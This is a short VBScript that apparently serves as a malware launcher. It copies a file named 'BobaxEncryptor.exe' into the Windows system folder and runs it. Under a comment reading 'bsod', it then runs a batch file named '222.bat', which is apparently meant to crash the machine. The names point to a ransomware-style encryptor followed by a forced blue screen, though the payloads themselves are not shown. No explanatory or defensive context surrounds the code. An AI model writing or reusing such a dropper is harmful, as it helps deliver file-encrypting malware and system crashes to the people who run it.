DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )
Set FSO = CreateObject("Scripting.FileSystemObject")

FSO.CopyFile "BobaxEncryptor.exe","C:\Windows\"
CreateObject("Wscript.Shell").Run """C:\Windows\BobaxEncryptor.exe""", 1, True

''' bsod
CreateObject("Wscript.Shell").Run """222.bat""", 1, True
